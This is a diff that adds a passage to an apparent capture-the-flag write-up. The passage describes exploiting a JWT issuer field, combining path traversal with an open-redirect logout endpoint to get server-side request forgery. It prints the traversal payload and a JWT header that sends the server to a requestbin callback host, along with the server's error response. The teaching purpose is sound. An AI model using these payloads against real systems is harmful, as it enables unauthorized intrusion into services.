@@ -55,7 +55,57 @@ Sending a request to an API endpoint we don't have access to gives us this respo
 }
 ```
 
-Hm, okay, that regex seems pretty easy to bypass. We could use something like ``/api/auth/pub-key/../../../../`` to get back to the base url. The only now is that we can't pass in a straight url since it will try to use it as a directory, it's not just slapped into a request, in fact I made this mistake in my last payload as well, that would've never worked because the original payload had a relative path.
+Hm, okay, that regex seems pretty easy to bypass. We could use something like ``/api/auth/pub-key/../../../../`` to get back to the base url. The only problem now is that we can't pass in a straight url since it will try to use it as a directory, it's not just slapped into a request, in fact I made this mistake in my last payload as well, that would've never worked because the original payload had a relative path.
+
+As soon as I ran into this issue I went back to the source code I had, almost immediately I noticed this in `admin.js`!!!
+
+```js
+setInterval(() => {
+        authAjax({
+            url: "/api/auth/isstaff",
+            type: "GET",
+            success: (data) => {
+                if (data.status === "error") {
+                    window.location = "/api/auth/logout?redirect=/logout";
+                }
+            },
+            error: errorCallback
+        });
+    }, 60000);
+```
+
+Do you see that? There's an api endpoint that redirects the user to a url. That's how it was kicking us out of the page, that also explains why sometimes it wouldn't kick us out immediately, it had to wait for the api.
+
+Anyway, this is huge! If we can make the server go to this endpoint we can control where it gets redirected, aka **SSRF**!!!. Let's make the payload!
+
+Alright so we know we can get to the base url using directory traversal ``/api/auth/pub-key/../../../../``, now we just need to go to the logout endpoint. That looks like this,
+
+``/api/auth/pub-key/../../../../api/auth/logout?redirect=EVIL``
+
+Let's put our requestbin url in our EVIL parameter and throw it in a JWT. Our JWT header now looks like this.
+
+```json
+{
+  "alg": "RS256",
+  "iss": "/api/auth/pub-key/../../../../api/auth/logout?redirect=https://requestbin.io/z39ug0z3",
+  "typ": "JWT"
+}
+```
+
+Sending that through...
+
+```json
+{
+    "result": "M8 you broke something: ('Could not deserialize key data. The data may be in an incorrect format, it may be encrypted with an unsupported algorithm, or it may be an unsupported key type (e.g. EC curves with explicit parameters).', [_OpenSSLErrorWithText(code=75497580, lib=9, reason=108, reason_text=b'error:0480006C:PEM routines::no start line')])",
+    "status": "error"
+}
+```
+
+NO WAY
+
+![image](https://user-images.githubusercontent.com/104875856/192215883-ad5f5900-69e7-4b26-be1a-5fef57785e68.png)
+
+
 
 
 
